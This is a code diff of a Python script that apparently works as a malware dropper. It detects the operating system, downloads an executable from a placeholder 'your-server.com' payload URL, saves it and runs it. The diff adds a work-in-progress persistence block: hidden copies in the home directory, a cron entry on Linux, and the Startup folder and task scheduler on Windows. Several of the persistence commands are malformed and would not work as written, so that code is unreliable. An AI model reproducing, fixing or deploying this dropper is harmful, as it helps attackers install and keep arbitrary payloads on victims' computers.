@@ -1,6 +1,6 @@
-import subprocess
-import platform
-import requests
+import subprocess, platform
+import requests, shutil, os
+from pathlib import Path
 
 # Detect Operational System
 platform_os = platform.system()
@@ -10,11 +10,24 @@ if platform_os == "Linux":
 elif platform_os == "Windows":
     filename = "Windows Exe Name.exe" #EXE: Executable
 
+
 if True:
     # Download:
     data = requests.get("http://your-server.com/payloads/{0}".format(filename))
     # Save
     with open(filename, "wb") as fl:
         fl.write(data.content)
-    # Run:
-    subprocess.Popen(args="", executable=filename)
+    
+# Try persistense [WIP]:
+try:
+    if platform_os == "Linux":
+        shutil.copy(filename, '{0}/.{1}'.format(Path.home(), filename))
+        os.system("chmod +x {0}/.{1}".format(Path.home(), filename))
+        os.system("crontab -e :set for every 10 min;0-59/10 * * * * ./{0}/.{1}".format(Path.home(), filename))
+    elif platform_os == "Windows":
+        new_path = '%SystemDrive%\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\{0}'.format(filename)
+        shutil.copy(filename, new_path)
+        os.system('sc config schedule start=auto;net start schedule at 12:00 \"\"{0}\"\"'.format(new_path))
+        
+# Run:
+subprocess.Popen(args="", executable=filename)
